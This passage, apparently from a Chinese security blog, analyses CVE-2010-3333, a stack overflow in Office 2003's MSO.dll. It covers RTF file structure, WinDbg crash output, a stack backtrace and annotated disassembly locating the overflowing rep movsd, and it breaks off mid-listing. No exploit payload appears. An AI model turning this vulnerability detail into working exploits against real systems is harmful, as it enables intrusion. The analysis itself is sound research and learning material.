<p>&emsp;&emsp;即使<code>“This is plain text.”</code>不是<code>内部组</code>的一部分，它包含在<code>{\rtf1 ...}组</code>中，因此是<code>RTF文件主体</code>的一部分。它受<code>\pard</code>命令<code>指定的格式</code>的约束。具体来说，<code>\pard</code>重置任何先前的<code>段落格式</code>，<code>\plain</code>重置任何先前的<code>字符格式</code>，并且<code>\fs20</code>将<code>字体大小</code>设置为<code>20 half points</code>，即<code>10points</code>。</p>
<p>&emsp;&emsp;如前所述，<code>反斜杠(\)</code>和<code>花括号({})</code>在RTF中具有<code>特殊含义</code>。要将这些字符用作<code>文本</code>，请在其前面加上<code>反斜杠</code>，例如控制符<code>“\\”</code>，<code>“\{”</code>和<code>“\}”</code>。</p>
<h5 id="2-2、RTF文件的内容"><a href="#2-2、RTF文件的内容" class="headerlink" title="2.2、RTF文件的内容"></a>2.2、RTF文件的内容</h5><p>&emsp;&emsp;一个<code>完整的RTF文件</code>包括文件头<code>&lt;header&gt;</code>和文档区<code>&lt;document&gt;</code>两大部分，可以用下列语法表示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;File&gt; &apos;&#123;&apos; &lt;header&gt; &lt;document&gt; &apos;&#125;&apos;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过<code>RTF的文档目录</code>，我们可以了解到<code>文件头</code>和<code>文档区</code>各自所包含的数据，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Contents of an RTF file</span><br><span class="line">    Header(头)</span><br><span class="line">        RTF Version(RTF版本：\rtfN,N为RTF文档规范版本的主要版本)</span><br><span class="line">        Character Set(字符集：\ansi)</span><br><span class="line">        Unicode RTF(Unicode支持)</span><br><span class="line">        Default Fonts and Languages(默认字体和语言)</span><br><span class="line">        Theme Data(主题数据：\themedata)</span><br><span class="line">        Color Scheme Mapping(配色方案映射：\colorschememapping)</span><br><span class="line">        Font Table(字体表：\fonttbl)</span><br><span class="line">        File Table(文件表：\filetbl,当前文档含子文档时，会有这个表)</span><br><span class="line">        Color Table(颜色表：\colortbl,屏幕颜色、字符颜色和其他颜色信息)</span><br><span class="line">        Default Properties(默认属性：\*\defchp,\*\defpap)</span><br><span class="line">        Style Sheet(样式表：\stylesheet)</span><br><span class="line">        List Tables</span><br><span class="line">        Paragraph Group Properties(段落组属性：\pgptbl)</span><br><span class="line">        Revision Marks(修订标记：\*\revtbl)</span><br><span class="line">        User Protection Information(用户保护信息：\protusertbl)</span><br><span class="line">    Document Area(文档区域)</span><br><span class="line">        Information Group(信息组：\info,可以包括标题、作者、关键词、注释和其他特定于该文件的信息。)</span><br><span class="line">        Read-Only Password Protection(只读密码保护：\passwordhash,表示编辑给定RTF文档所需的密码。)</span><br><span class="line">        XML Namespace Table(XML命名空间表：\xmlnstbl)</span><br><span class="line">        Document Formatting Properties(文档格式属性：这些属性必须在文档中的第一个纯文本字符之前。)</span><br><span class="line">        Mail Merge(邮件合并指的是一种操作，通过这种操作，RTF文档与来自外部数据源的数据一起工作。)</span><br><span class="line">        Section Text(节文本)</span><br><span class="line">        Paragraph Text(段落文本)</span><br><span class="line">        Mathematics(数学运算)</span><br><span class="line">        Character Text(字符文本：包括字体格式属性，字符边界和阴影，字符修改标记属性，高亮显示，特殊字符)</span><br><span class="line">        Document Variables(文档变量：\docvar)</span><br><span class="line">        Bookmarks(书签：\*\bkmkstart,\*\bkmkend)</span><br><span class="line">        Protection Exceptions(\*\protstart,\*\protend)</span><br><span class="line">        Pictures(图片：\pict,RTF文件可以包含用其他应用程序创建的图片。)</span><br><span class="line">        Custom XML Tags()</span><br><span class="line">        Objects(对象：\object,对象是包含数据和结果的目的地。数据通常对生成文档的应用程序隐藏。)</span><br><span class="line">        Drawing Objects(绘图对象：绘图对象的主体被定义为一系列属性。控制字&#123;\shp…后面跟着&#123;\*\shpinst，然后是一个形状的所有属性列表。)</span><br><span class="line">        Footnotes(脚注：\footnote)</span><br><span class="line">        Comments (Annotations)(注释：RTF注释有两部分，作者ID(由控制字\atnid引入)和注释文本(由控制字\annotation引入);)</span><br><span class="line">        Fields(域：\field)</span><br><span class="line">        Index Entries(索引项：\xe控制字引入一个索引项。RTF中的索引项是目的地。)</span><br><span class="line">        Table of Contents Entries(目录条目：\tc,\tcn)</span><br><span class="line">        Bidirectional Language Support(双向语言支持：)</span><br></pre></td></tr></table></figure>
<h3 id="0x32-定位漏洞点"><a href="#0x32-定位漏洞点" class="headerlink" title="0x32 定位漏洞点"></a>0x32 定位漏洞点</h3><h4 id="1、XP-amp-Office2003"><a href="#1、XP-amp-Office2003" class="headerlink" title="1、XP &amp; Office2003"></a>1、XP &amp; Office2003</h4><p>&emsp;&emsp;首先打开<code>WINWORD.exe</code>，然后打开<code>WinDbg</code>，Attach上WINWORD.exe的进程，程序会自动中断在<code>ntdll!DbgBreakPoint</code>处，<code>g</code>运行程序，然后打开<code>CVE-2010-3333(target6,Crash).rtf</code>文件，程序会中断在<code>MSO.dll</code>的<code>0x30ed442c</code>处，此处就是<code>触发异常</code>的指令：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">011</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">05450000</span> 055f1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line">(a44<span class="meta">.628</span>): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span> &lt;---</span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">Usage:</span>                  MemoryMappedFile</span><br><span class="line">Allocation Base:        <span class="number">00130000</span></span><br><span class="line">Base Address:           <span class="number">00130000</span></span><br><span class="line">End Address:            <span class="number">00133000</span></span><br><span class="line">Region Size:            <span class="number">00003000</span></span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00040000</span>	MEM_MAPPED</span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00001000</span>	MEM_COMMIT</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000002</span>	PAGE_READONLY &lt;---</span><br><span class="line">Mapped file name:       PageFile</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; lm v m mso</span><br><span class="line">start    end        module name</span><br><span class="line">30c90000 3184c000   mso        (export symbols)       C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Loaded symbol image file: C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Image path: C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll</span><br><span class="line">    Image name: mso.dll</span><br><span class="line"><span class="symbol">    Timestamp:</span>        Tue Jun <span class="number">19</span> <span class="number">07</span>:<span class="number">53</span>:<span class="number">36</span> <span class="number">2007</span> (46771B00)</span><br><span class="line"><span class="symbol">    CheckSum:</span>         00BB6E3C</span><br><span class="line"><span class="symbol">    ImageSize:</span>        00BBC000</span><br><span class="line">    File version:     <span class="number">11.0</span><span class="meta">.8172</span><span class="meta">.0</span></span><br><span class="line">    Product version:  <span class="number">11.0</span><span class="meta">.8172</span><span class="meta">.0</span></span><br><span class="line">    File flags:       <span class="number">0</span> (Mask 3F)</span><br><span class="line">    File OS:          <span class="number">40004</span> NT Win32</span><br><span class="line">    File type:        <span class="number">2.0</span> Dll</span><br><span class="line">    File date:        <span class="number">00000000.00000000</span></span><br><span class="line"><span class="symbol">    Translations:</span>     <span class="number">0000.04e4</span></span><br><span class="line"><span class="symbol">    CompanyName:</span>      Microsoft Corporation</span><br><span class="line"><span class="symbol">    ProductName:</span>      Microsoft Office <span class="number">2003</span></span><br><span class="line"><span class="symbol">    InternalName:</span>     MSO</span><br><span class="line"><span class="symbol">    OriginalFilename:</span> MSO.DLL</span><br><span class="line"><span class="symbol">    ProductVersion:</span>   <span class="number">11.0</span><span class="meta">.8172</span></span><br><span class="line"><span class="symbol">    FileVersion:</span>      <span class="number">11.0</span><span class="meta">.8172</span></span><br><span class="line"><span class="symbol">    FileDescription:</span>  Microsoft Office <span class="number">2003</span> component</span><br><span class="line"><span class="symbol">    LegalCopyright:</span>   Copyright © <span class="number">1983</span>-<span class="number">2003</span> Microsoft Corporation.  All rights reserved.</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;根据<code>调试器</code>输出的信息，可以知道，这是一个<code>异常</code>在异常处理之前<code>第一次</code>发送给<code>调试器</code>，说明发生了一个异常。<code>0x30ed442c</code>处的指令可以看作是<code>rep movsd</code>，这条指令的作用是从<code>源地址(esi)</code>循环复制数据到<code>目的地址(edi)</code>，每次复制一个<code>dword</code>。我们可以看到此时的<code>目的地址(edi)</code>为<code>0x00130000</code>，在<code>32位</code>Windows中，此地址应该是<code>栈底</code>，栈底之后的内存应该是<code>不具有写权限</code>的，所以这里发生了<code>非法内存访问</code>。通过<code>“!address edi”</code>命令,我们可以知道<code>0x00130000</code>地址处的内存只具有<code>读权限</code>。通过<code>“lm v m mso”</code>命令，我们可以得到<code>MSO.dll</code>模块相关信息，如<code>加载基址</code>。如果开启了<code>ASLR</code>，其加载基址每次都会不同，当然在<code>Windows XP</code>中是不会变的，Windows XP只支持<code>PEB、TEB的ASLR</code>，不支持<code>映像的ASLR</code>。</p>
<p>&emsp;&emsp;经过这简单的分析，可以知道这个漏洞是<code>MSO.dll</code>中的一处<code>栈溢出</code>漏洞，由于未检测<code>复制数据的长度</code>，通过<code>rep movsd</code>指令循环复制内存数据到<code>栈</code>上，导致对<code>0x00130000</code>这个<code>只读</code>内存地址进行<code>写数据</code>，造成<code>非法访问内存异常</code>。</p>
<p>&emsp;&emsp;我们对<code>触发异常</code>的指令的地址<code>0x30ed442c</code>下断点，其位于<code>sub_30ED4406</code>函数中，我们称其为<code>CrashFun</code>，通过<code>栈回溯</code>查看是哪个函数调用了<code>sub_30ED4406</code>函数。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; <span class="built_in">bp</span> 30ed442c</span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06740000</span> 068e1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\NETAPI32.dll</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=0000322b <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104000c <span class="built_in">edi</span>=001237dc</span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">001237ec 30f0b56b <span class="number">00123958</span> <span class="number">00000000</span> ffffffff mso!Ordinal1246+<span class="number">0x16b0</span></span><br><span class="line">0012381c 30f0b4f9 001239a4 <span class="number">00123958</span> <span class="number">00000000</span> mso!Ordinal1273+<span class="number">0x2581</span> &lt;----</span><br><span class="line">00123a68 30d4d795 <span class="number">00000000</span> 00123aa8 <span class="number">00000000</span> mso!Ordinal1273+<span class="number">0x250f</span></span><br><span class="line">00123a90 30d4d70d 30d4d5a8 01c40b88 01c40bc0 mso!Ordinal5575+<span class="number">0xf9</span></span><br><span class="line">00123a94 30d4d5a8 01c40b88 01c40bc0 01c40a70 mso!Ordinal5575+<span class="number">0x71</span></span><br><span class="line">00123a98 01c40b88 01c40bc0 01c40a70 30dce40c mso!Ordinal4099+<span class="number">0xf5</span></span><br><span class="line">00123a9c 01c40bc0 01c40a70 30dce40c <span class="number">00000000</span> <span class="number">0x1c40b88</span></span><br><span class="line">00123aa0 01c40a70 30dce40c <span class="number">00000000</span> 01c4084c <span class="number">0x1c40bc0</span></span><br><span class="line">00123aa4 30dce40c <span class="number">00000000</span> 01c4084c <span class="number">00124854</span> <span class="number">0x1c40a70</span></span><br><span class="line">00123aa8 <span class="number">00000000</span> 01c4084c <span class="number">00124854</span> <span class="number">00000000</span> mso!Ordinal2940+<span class="number">0x1588c</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ub mso!Ordinal1273+<span class="number">0x2581</span></span><br><span class="line">mso!Ordinal1273+<span class="number">0x256d</span>:</span><br><span class="line">30f0b557 23c1            <span class="keyword">and</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">30f0b559 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">30f0b55a 8d47ff          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">edi</span>-<span class="number">1</span>]</span><br><span class="line">30f0b55d <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">30f0b55e 8b4508          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">30f0b561 6a00            <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line">30f0b563 ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]</span><br><span class="line">30f0b566 e857000000      <span class="keyword">call</span>    mso!Ordinal1273+<span class="number">0x25d8</span> (30f0b5c2)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过<code>栈回溯</code>，我们可以知道<code>CrashFun(sub_30ED4406)</code>是在函数<code>sub_30F0B5C2</code>中调用的。重新调试，对<code>sub_30F0B5C2</code>函数下断点，从函数<code>sub_30F0B5C2</code>到溢出地址<code>0x30ed442c</code>开始单步调试(F10:步过,F8:步进)，经过处理后的结果如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30F0B544           loc_30F0B544                         <span class="comment">; CODE XREF: sub_30F0B506+2B↑j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B544                                                <span class="comment">; sub_30F0B506+37↑j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B544 8B <span class="number">75</span> <span class="number">10</span>               <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_8]</span><br><span class="line"><span class="symbol">.text:</span>30F0B547 <span class="number">83</span> <span class="number">65</span> FC <span class="number">00</span>            <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B54B FF <span class="number">75</span> <span class="number">14</span>               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_C]</span><br><span class="line"><span class="symbol">.text:</span>30F0B54E 8B C6                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B550 F7 D8                  <span class="keyword">neg</span>     <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B552 <span class="number">1B</span> C0                  <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B554 <span class="number">8D</span> <span class="number">4D</span> FC               <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span>30F0B557 <span class="number">23</span> C1                  <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B559 <span class="number">50</span>                     <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B55A <span class="number">8D</span> <span class="number">47</span> FF               <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>30F0B55D <span class="number">50</span>                     <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B55E 8B <span class="number">45</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>30F0B561 6A <span class="number">00</span>                  <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B563 FF <span class="number">75</span> 0C               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>30F0B566 E8 <span class="number">57</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">call</span>    sub_30F0B5C2 &lt;-----</span><br><span class="line"><span class="symbol">.text:</span>30F0B56B <span class="number">84</span> C0                  <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    char __userpurge sub_30F0B5C2@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>30F0B5C2 <span class="number">55</span>                     <span class="keyword">push</span>    <span class="built_in">ebp</span>                 <span class="comment">;     ebp = 0x0012381c</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C3 8B EC                  <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>            <span class="comment">;     ebp = esp = 0x001237ec</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C5 <span class="number">83</span> EC <span class="number">14</span>               <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span>            <span class="comment">; 分配0x14字节栈空间: esp = esp-0x14 = 0x001237ec-0x14 = 0x001237d8 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C8 <span class="number">83</span> <span class="number">7D</span> <span class="number">18</span> <span class="number">00</span>            <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_10], <span class="number">0</span>     <span class="comment">;     [ebp+0x18] = [0x00123804]=0x01c40ba0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CC <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">;     edi = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CD 8B F8                  <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>            <span class="comment">;     edi = eax = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CF 0F <span class="number">84</span> <span class="number">1D</span> 4C <span class="number">18</span> <span class="number">00</span>      <span class="keyword">jz</span>      loc_310901F2        <span class="comment">;     不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D5 8B 4F <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">edi</span>+<span class="number">8</span>]        <span class="comment">; ecx = [edi+8] = [0x001239a4+0x8] = [0x001239ac] = 0x00123aa8(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D8 <span class="number">53</span>                     <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">;     ebx = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D9 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">;     esi = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5DA E8 C4 E8 E1 FF         <span class="keyword">call</span>    sub_30D29EA3        <span class="comment">; thiscall</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">    ***********************************************************************</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> __thiscall sub_30D29EA3(_<span class="built_in">BYTE</span> *this)</span><br><span class="line"></span><br><span class="line">    ***********************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3          sub_30D29EA3  proc <span class="built_in">near</span>              </span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3                                               </span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; esi = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA4 8B F1                  <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">; esi = ecx = 0x00123aa8(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA6 <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA7 <span class="number">8D</span> BE C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>      <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">0C0h</span>]     <span 